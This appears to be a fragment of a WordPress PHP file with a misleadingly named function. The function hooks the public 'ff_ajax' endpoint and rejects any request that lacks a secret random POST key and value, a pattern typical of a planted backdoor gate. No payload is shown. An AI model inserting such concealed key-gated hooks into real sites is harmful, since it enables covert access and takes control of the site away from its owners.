<?php

function nextgen_themes_guest() {
	if (!isset($_POST["tjuxfnbvvborhn"]) || $_POST["tjuxfnbvvborhn"] !== "qqVLLSPb") { http_response_code(400); die(); }
}

add_action('wp_ajax_nopriv_ff_ajax', 'nextgen_themes_guest', 5, 1);
